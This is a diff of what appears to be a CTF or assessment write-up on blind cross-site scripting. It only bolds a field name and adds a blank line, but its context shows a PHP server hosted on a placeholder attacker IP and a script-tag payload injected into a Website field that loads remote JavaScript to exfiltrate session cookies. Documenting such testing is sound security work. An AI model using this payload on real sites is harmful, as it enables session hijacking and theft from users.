@@ -79,7 +79,7 @@ I then hosted these files using PHP’s built-in server, as Netcat was unable to
 sudo php -S <attacker_ip>:80
 ```
 
-Finally, I injected the following payload into the Website field to trigger the exploit:
+Finally, I injected the following payload into the **Website** field to trigger the exploit:
 
 ```
 test<script src="http://<attacker_ip>/script.js"></script>
@@ -106,6 +106,7 @@ This confirms the presence of a critical XSS vulnerability that could allow atta
 - Blind XSS successfully triggered via the **Website** field  
 - External script execution enabled cookie exfiltration  
 - Captured session data revealed the assessment flag
+
 
 
 
